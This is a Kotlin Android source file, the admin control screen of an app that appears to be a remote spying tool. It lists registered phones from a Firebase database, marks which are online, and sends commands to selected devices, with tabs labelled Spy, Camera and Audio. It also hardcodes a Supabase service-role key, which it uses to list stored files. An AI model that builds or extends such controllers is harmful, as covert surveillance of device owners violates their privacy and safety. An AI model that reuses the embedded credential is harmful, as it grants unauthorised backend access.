package com.example.devsync

  import android.graphics.Color
  import android.os.*
  import android.view.View
  import android.widget.TextView
  import androidx.appcompat.app.AppCompatActivity
  import androidx.fragment.app.Fragment
  import com.google.android.material.bottomnavigation.BottomNavigationView
  import com.google.firebase.database.*
  import kotlinx.coroutines.*
  import okhttp3.*
  import okhttp3.MediaType.Companion.toMediaType
  import okhttp3.RequestBody.Companion.toRequestBody
  import org.json.JSONArray
  import java.util.concurrent.TimeUnit

  class AdminControlActivity : AppCompatActivity() {

      companion object {
          const val DB_URL        = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
          const val SUPABASE_URL  = "https://xzslribjzliewpyattcl.supabase.co"
          const val SUPABASE_KEY  = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
          const val ONLINE_THRESHOLD_MS = 90_000L

          val selectedIds = mutableSetOf<String>()
          val deviceList  = mutableListOf<DeviceInfo>()

          fun convertGoogleDriveUrl(url: String): String = when {
              url.contains("drive.google.com/file/d/") ->
                  "https://drive.google.com/uc?export=download&id=${url.substringAfter("/file/d/").substringBefore("/")}"
              url.contains("drive.google.com/open?id=") ->
                  "https://drive.google.com/uc?export=download&id=${url.substringAfter("open?id=").substringBefore("&")}"
              else -> url
          }
      }

      val database by lazy { FirebaseDatabase.getInstance(DB_URL) }
      val http = OkHttpClient.Builder().callTimeout(30, TimeUnit.SECONDS).build()

      private lateinit var bottomNav: BottomNavigationView
      private lateinit var tvActionStatus: TextView
      private lateinit var tvDeviceCount: TextView
      private lateinit var tvSelectedCount: TextView
      private val statusHandler = Handler(Looper.getMainLooper())

      private val fragmentCache = mutableMapOf<Int, Fragment>()

      override fun onCreate(savedInstanceState: Bundle?) {
          super.onCreate(savedInstanceState)
          setContentView(R.layout.activity_admin)

          bottomNav       = findViewById(R.id.bottomNav)
          tvActionStatus  = findViewById(R.id.tvActionStatus)
          tvDeviceCount   = findViewById(R.id.tvDeviceCount)
          tvSelectedCount = findViewById(R.id.tvSelectedCount)

          showFragment(R.id.nav_devices)

          bottomNav.setOnItemSelectedListener { item ->
              showFragment(item.itemId)
              true
          }

          setupDeviceListener()
      }

      // ── Fragment Navigation ───────────────────────────────────────────────────

      private fun showFragment(id: Int) {
          val fragment = fragmentCache.getOrPut(id) {
              when (id) {
                  R.id.nav_devices  -> DevicesFragment()
                  R.id.nav_spy      -> SpyFragment()
                  R.id.nav_camera   -> CameraFragment()
                  R.id.nav_audio    -> AudioFragment()
                  R.id.nav_controls -> ControlsFragment()
                  else              -> DevicesFragment()
              }
          }
          supportFragmentManager.beginTransaction()
              .replace(R.id.fragmentContainer, fragment)
              .commit()
      }

      // ── Status Banner ─────────────────────────────────────────────────────────

      fun showStatus(msg: String, success: Boolean) {
          runOnUiThread {
              tvActionStatus.text = msg
              tvActionStatus.setBackgroundColor(
                  if (success) Color.parseColor("#0A3020") else Color.parseColor("#3A0A0A"))
              tvActionStatus.setTextColor(
                  if (success) Color.parseColor("#00FF88") else Color.parseColor("#FF4444"))
              tvActionStatus.visibility = View.VISIBLE
              statusHandler.removeCallbacksAndMessages(null)
              statusHandler.postDelayed({ tvActionStatus.visibility = View.GONE }, 4000)
          }
      }

      // ── Device Selection ──────────────────────────────────────────────────────

      fun sendToSelected(action: (DatabaseReference) -> Unit) {
          if (selectedIds.isEmpty()) {
              showStatus("❌ Pehle koi device select karo!", false)
              return
          }
          try {
              selectedIds.forEach { id -> action(database.getReference("devices/$id")) }
              showStatus("✅ Command sent to ${selectedIds.size} device(s)", true)
          } catch (e: Exception) {
              showStatus("❌ Error: ${e.message}", false)
          }
      }

      fun db(path: String): DatabaseReference = database.getReference(path)

      fun updateSelectionBadge() {
          tvSelectedCount.text = "${selectedIds.size} selected"
      }

      // ── Device List Listener ──────────────────────────────────────────────────

      private fun setupDeviceListener() {
          database.getReference("registered_devices").addValueEventListener(object : ValueEventListener {
              override fun onDataChange(snapshot: DataSnapshot) {
                  val now = System.currentTimeMillis()
                  deviceList.clear()
                  snapshot.children.forEach { child ->
                      val id        = child.key ?: return@forEach
                      val name      = child.child("name").getValue(String::class.java) ?: id
                      val model     = child.child("model").getValue(String::class.java) ?: ""
                      val lastSeen  = child.child("lastSeen").getValue(Long::class.java) ?: 0L
                      val online    = (now - lastSeen) < ONLINE_THRESHOLD_MS
                      val lastStatus = child.child("lastStatus").getValue(String::class.java) ?: ""
                      val lastStatusTime = child.child("lastStatusTime").getValue(Long::class.java) ?: 0L
                      deviceList.add(DeviceInfo(id, name, model, online, lastSeen, lastStatus, lastStatusTime))
                  }
                  val onlineCount = deviceList.count { it.online }
                  runOnUiThread {
                      tvDeviceCount.text = "$onlineCount online"
                      // Notify current fragment if it's DevicesFragment
                      val current = supportFragmentManager.findFragmentById(R.id.fragmentContainer)
                      if (current is DevicesFragment) current.refreshDeviceList()
                  }
              }
              override fun onCancelled(error: DatabaseError) {}
          })
      }

      // ── Shared Supabase Helper ────────────────────────────────────────────────

      fun supabaseList(bucket: String): JSONArray {
          val body = """{"limit":200,"offset":0,"prefix":"","sortBy":{"column":"created_at","order":"desc"}}"""
          return try {
              val req = Request.Builder()
                  .url("$SUPABASE_URL/storage/v1/object/list/$bucket")
                  .header("Authorization", "Bearer $SUPABASE_KEY")
                  .header("apikey", SUPABASE_KEY)
                  .header("Content-Type", "application/json")
                  .post(body.toRequestBody("application/json".toMediaType()))
                  .build()
              http.newCall(req).execute().use { JSONArray(it.body?.string() ?: "[]") }
          } catch (_: Exception) { JSONArray() }
      }
  }
  